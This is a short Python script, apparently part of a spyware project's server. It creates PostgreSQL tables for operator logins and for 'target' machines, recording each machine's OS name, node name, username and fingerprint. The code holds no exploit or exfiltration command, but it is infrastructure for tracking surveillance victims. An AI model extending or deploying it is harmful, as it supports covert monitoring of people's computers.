import psycopg2 as pg

from spyware_server_common.config import get_config

def add_extensions (cursor) :
    sql_statement = 'CREATE EXTENSION IF NOT EXISTS "uuid-ossp";'
    cursor.execute(sql_statement)
    cursor.connection.commit()

    print ("[*] Added extensions")

# Create table for authentication
def create_access_table (cursor) :
    sql_statement = '''CREATE TABLE IF NOT EXISTS access (
        id SERIAL PRIMARY KEY,
        username VARCHAR(100) NOT NULL UNIQUE,
        password TEXT NOT NULL,
        active BOOLEAN DEFAULT true
    );'''

    cursor.execute('DROP TABLE IF EXISTS access;')
    cursor.execute(sql_statement)
    cursor.connection.commit()
    print ("[*] Authentication table has been created")

# Create table to store data about target
def create_target_table (cursor) :
    sql_statement = '''CREATE TABLE IF NOT EXISTS "target" (
        fp VARCHAR PRIMARY KEY,
        os_name VARCHAR NOT NULL,
        nodename VARCHAR NOT NULL,
        username VARCHAR NOT NULL,
        added_date TIMESTAMP DEFAULT NOW()
    );'''

    cursor.execute('DROP TABLE IF EXISTS "target";')
    cursor.execute(sql_statement)
    cursor.connection.commit()
    print ("[*] Target table has been created")

def initDb (*args):
    config = get_config(*args)
    connection = pg.connect(**config["db"])
    cursor = connection.cursor()

    add_extensions(cursor) # add extensions
    create_access_table(cursor) # Create access table
    create_target_table(cursor) # create target table

    cursor.close()
    connection.close()